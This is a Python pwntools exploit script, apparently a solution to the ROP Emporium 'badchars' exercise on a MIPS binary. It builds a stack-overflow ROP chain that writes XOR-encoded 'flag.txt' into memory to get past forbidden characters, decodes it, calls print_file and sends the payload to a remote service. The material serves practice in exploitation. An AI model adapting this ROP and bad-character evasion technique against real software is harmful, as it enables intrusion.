from pwn import *
BINARY = "./badchars_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

write_to_addr = 0x00400930
xor_decrypt = 0x00400948
print_file = 0x00400968

rop = b"A" * 0x24

rop += p32(write_to_addr)

rop += b"B" * 0x4 
rop += b"\x66\x6c\x60\x66"
rop += p32(0x00411000)
rop += p32(write_to_addr)

rop += b"B" * 0x4 
rop += b"\x2f\x74\x79\x74"
rop += p32(0x00411004)
rop += p32(xor_decrypt)

rop += b"B" * 0x4 
rop += p32(0x00411000)
rop += b"\x00\x00\x01\x01"
rop += p32(xor_decrypt)

rop += b"B" * 0x4 
rop += p32(0x00411004)
rop += b"\x01\x00\x01\x00"
rop += p32(print_file)

rop += b"B" * 0x4 
rop += p32(ELF.symbols['print_file'])
rop += p32(0x00411000)
with open("./raw", "wb") as f:
    f.write(rop)
p = remote("10.0.0.2", 9999)
p.sendline(rop)
print(p.recvline_contains(b"ROPE"))